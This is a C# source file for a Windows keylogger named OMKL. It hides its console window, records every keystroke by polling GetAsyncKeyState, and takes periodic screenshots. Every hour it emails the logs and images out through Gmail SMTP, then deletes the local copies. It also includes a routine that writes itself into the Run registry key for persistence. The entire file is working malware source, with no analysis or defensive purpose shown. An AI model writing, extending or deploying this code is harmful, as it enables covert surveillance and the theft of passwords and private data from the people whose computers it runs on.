using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using Microsoft.Win32;

namespace OMKL
{
    class Program
    {
        private const int _screenshotWidth = 1200;
        private const int _screenshotHeight = 800;
        private const int _sendMailDelay = 60*60000;//in milisec
        private const int _logGranularity = 1;//in minutes
        private const string mailUser = "mail@gmail.com";
        private const string mailPassword = "password";
        private const string _filesPath = "";
        private const string _logName = "Log.lo";
        private const string _attachmentLog = "attachmentLog.lo";
        private bool _runOnStartup = true;

        private static int i;

        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        static void Main(string[] args)
        {

            try
            {   
                HideWindow();
                SendMailScheduler();
                LogKeys();
            }
            catch(Exception e)
            {
                LogPrint("Exception Caught: " + e.Message);
                LogPrint("Inner Exception: " + e.InnerException);
            }

        }

            
        private void SetStartup()
        {
            RegistryKey rk = Registry.CurrentUser.OpenSubKey
                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            if (_runOnStartup)
                rk.SetValue("omkl", Application.ExecutablePath);
            else
                rk.DeleteValue("omkl", false);

        }

    static void HideWindow()
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
        }

        static void LogPrint(string message)
        {
            var now = DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss");
            Console.WriteLine(now + ": "+message);
        }
        static string[] GetScreenshotsList()
        {
            LogPrint("Getting Screenshot files list.");
            string[] filePaths = Directory.GetFiles(GetWorkingFolder(), "*.jpg");
            return filePaths;
        }

        static string[] GetLogsList()
        {
            LogPrint("Getting Logs files list.");
            string[] filePaths = Directory.GetFiles(GetWorkingFolder(), "*.lo");
            return filePaths;
        }


        static string GetWorkingFolder()
        {
            LogPrint("Getting working folder.");
            //return Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\LogsFolder\";
            return @"LogsFolder\";
        }

        static void ScreenCapture()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    LogPrint("Taking screenshot.");
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }

                var path = GetWorkingFolder() + DateTime.Now.ToString("dd-MM-yyyy HH:mm:ss").Replace(":", "-") + ".jpg";
                LogPrint("Resizing and Saving screenshot into path: "+path);

                try
                {
                    new Bitmap(bitmap, _screenshotWidth, _screenshotHeight).Save(path, ImageFormat.Jpeg);
                }
                catch(Exception e)
                {
                    LogPrint("Exception while saving screenshot: " + e.Message);
                }
            }

        }

        static void SendMailScheduler()
        {
            new Thread(() =>
            {
                Thread.CurrentThread.IsBackground = true;

                while(true)
                {
                    Thread.Sleep(_sendMailDelay);
                    LogPrint("Send mail scheduler.");
                    SendMail();
                }

            }).Start();
        }

        static void SendMail()
        {
            string logPath = GetWorkingFolder() + @"\"+ _logName; // get log path

            DateTime dateTime = DateTime.Now; // call date 
            string subtext = "Loggedfiles"; // email subject
            subtext += dateTime;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587); // 587 is gmail's port
            MailMessage LOGMESSAGE = new MailMessage();
            LOGMESSAGE.From = new MailAddress(mailUser); // enter email that sends logs
            LOGMESSAGE.To.Add(mailUser); // enter recipiant 
            LOGMESSAGE.Subject = subtext; // subject

            client.UseDefaultCredentials = false;      // call email creds
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential(mailUser, mailPassword);

            string newfile = File.ReadAllText(logPath); // reads log file 
            System.Threading.Thread.Sleep(2);
            string attachmenttextfile = GetWorkingFolder() + @"\"+_attachmentLog; // path to find new file !
            File.WriteAllText(attachmenttextfile, newfile); // writes all imformation to new file 
            System.Threading.Thread.Sleep(2);
            LOGMESSAGE.Attachments.Add(new Attachment(attachmenttextfile)); // addds attachment to email

            var screenshotsList = GetScreenshotsList();

            foreach(var path in screenshotsList)
            {
                LogPrint("Adding attachment to mail.");
                LOGMESSAGE.Attachments.Add(new Attachment(path)); // addds attachment to email
            }

            LOGMESSAGE.Body = subtext; // body of message im just leaving it blank

            LogPrint("Sending Mail.");

            try
            {
                client.Send(LOGMESSAGE);
            }
            catch (Exception e)
            {
                LogPrint("Exception while sending mail: " + e.Message);
            }
             
            LogPrint("------------------------------------------Mail Sent------------------------------------------");


            DeleteAttachments(LOGMESSAGE.Attachments);
            DeleteLogFiles();

            LOGMESSAGE = null; // emptys previous values !
          
        }

        static void DeleteAttachments(AttachmentCollection attachments)
        {
            //Clean up attachments
            foreach (Attachment attachment in attachments)
            {
                LogPrint("Cleaning up attachments.");
                attachment.Dispose();
            }

            //deletefles after they are sent

            var screenshotsList = GetScreenshotsList();

            foreach (string path in screenshotsList)
            {
                LogPrint("Deleting Screenshot Files.");
                File.Delete(path);
            }
        }

        static void DeleteLogFiles()
        {
            var logsList = GetLogsList();

            foreach (string path in logsList)
            {
                LogPrint("Deleting Log Files.");
                File.Delete(path);
            }
        }

        static void LogKeys()
        {
            var filepath = GetWorkingFolder();

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (@filepath + _logName);

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {
                    LogPrint("Log doesn't Exists, Creating Log.");
                }
                //end
            }

            KeysConverter converter = new KeysConverter();
            string text = "";

            var prev = DateTime.Now;

            using (StreamWriter sw = File.AppendText(path))
            {
                sw.WriteLine();
                sw.Write("[" + prev.ToString("dd/MM/yyyy HH:mm:ss") + "] ");
            }

            while (true)
            {
                Thread.Sleep(5);
                for (Int32 i = 0; i < 2000; i++)
                {
                    int key = GetAsyncKeyState(i);

                    if (key == 1 || key == -32767)
                    {
                        text = converter.ConvertToString(i);

                        if (!File.Exists(path))
                        {
                            using (StreamWriter sw = File.CreateText(path))
                            {
                                sw.Write("[" + DateTime.Now.ToString("dd/MM/yyyy HH:mm:ss") + "] ");
                            }
                            //end
                        }

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            var now = DateTime.Now;

                            //print time every minute
                            if(now.Subtract(prev).TotalMinutes> _logGranularity)
                            {
                                LogPrint("Writing new timestamp in logger.");
                                prev = now;
                                sw.WriteLine();
                                sw.Write("["+now.ToString("dd/MM/yyyy HH:mm:ss")+"] ");
                                ScreenCapture();
                            }
                            
                            //no need to log mouse button clicks
                            if(text == "LButton" || text == "RButton")
                            {
                                break;
                            }
                            LogPrint("Saving: "+text);
                            sw.Write(text+" ");
                        }
                        break;
                    }
                }
            }
        }
    }
}
